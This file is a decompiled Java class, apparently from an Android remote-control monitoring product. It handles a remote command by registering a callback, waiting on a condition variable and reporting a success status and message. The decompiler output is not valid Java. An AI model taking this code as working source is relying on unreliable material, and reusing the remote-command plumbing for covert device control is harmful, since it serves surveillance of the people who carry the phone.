package com.vvt.appengine.a;

import android.os.ConditionVariable;

import com.vvt.appengine.AppEngine1;
import com.vvt.datadeliverymanager.b;
import com.vvt.datadeliverymanager.i;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;
import com.vvt.temporalcontrol.d;

public class at
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private RmtCtrlOutputStatusMessage c;
  private com.vvt.datadeliverymanager.a.a d;
  private ConditionVariable e;
  
  public at()
  {
    Object localObject = new com/vvt/remotecontrol/output/RmtCtrlOutputStatusMessage;
    ((RmtCtrlOutputStatusMessage)localObject).<init>();
    this.c = ((RmtCtrlOutputStatusMessage)localObject);
    localObject = b();
    this.d = ((com.vvt.datadeliverymanager.a.a)localObject);
  }
  
  private com.vvt.datadeliverymanager.a.a b()
  {
    au localau = new com/vvt/appengine/a/au;
    localau.<init>(this);
    return localau;
  }
  
  public RmtCtrlOutputStatusMessage a(ControlCommand paramControlCommand, AppEngine1 paramh)
  {
    boolean bool2;
    Object localObject4;
    try
    {
      boolean bool1 = a;
      if (bool1) {}
      Object localObject1 = new android/os/ConditionVariable;
      bool2 = false;
      localObject4 = null;
      ((ConditionVariable)localObject1).<init>(false);
      this.e = ((ConditionVariable)localObject1);
      try
      {
        localObject1 = paramh.al;
        localObject4 = this.d;
        ((d)localObject1).a((com.vvt.datadeliverymanager.a.a)localObject4);
        localObject1 = paramh.al;
        localObject4 = paramh.g;
        ((d)localObject1).b((b)localObject4);
        localObject1 = this.e;
        ((ConditionVariable)localObject1).block();
      }
      catch (Exception localException)
      {
        for (;;)
        {
          bool2 = b;
          if (bool2) {}
          localObject4 = this.c;
          ((RmtCtrlOutputStatusMessage)localObject4).setSuccess(false);
          localObject4 = this.c;
          Object localObject2 = localException.getMessage();
          ((RmtCtrlOutputStatusMessage)localObject4).setMessage((String)localObject2);
          localObject2 = this.e;
          ((ConditionVariable)localObject2).open();
        }
      }
      bool1 = a;
      if (bool1) {}
      localObject1 = this.c;
      return (RmtCtrlOutputStatusMessage)localObject1;
    }
    finally {}
  }
  
  void a(i parami)
  {
    synchronized (this.c)
    {
      RmtCtrlOutputStatusMessage localRmtCtrlOutputStatusMessage2 = this.c;
      boolean bool = parami.f();
      localRmtCtrlOutputStatusMessage2.setSuccess(bool);
      localRmtCtrlOutputStatusMessage2 = this.c;
      String str = parami.e();
      localRmtCtrlOutputStatusMessage2.setMessage(str);
      return;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/at.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */